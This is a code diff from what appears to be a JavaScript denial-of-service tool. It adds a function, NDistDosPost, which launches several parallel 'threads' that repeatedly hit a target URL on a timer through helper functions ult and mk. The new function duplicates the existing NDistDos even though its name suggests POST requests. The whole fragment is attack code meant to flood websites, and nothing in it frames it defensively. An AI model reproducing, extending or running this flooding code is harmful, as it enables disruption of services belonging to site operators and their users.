@@ -18,6 +18,11 @@ function NDistDos(url, threads=2, interval) {
   })
 }
 
+function NDistDosPost(url, threads=2, interval) {
+  Array(threads).fill(1).forEach(thread => {
+    ult(url, interval)
+  })
+}
 function ult(url_, interval_) {
   setInterval(()=>{
     mk(url_)
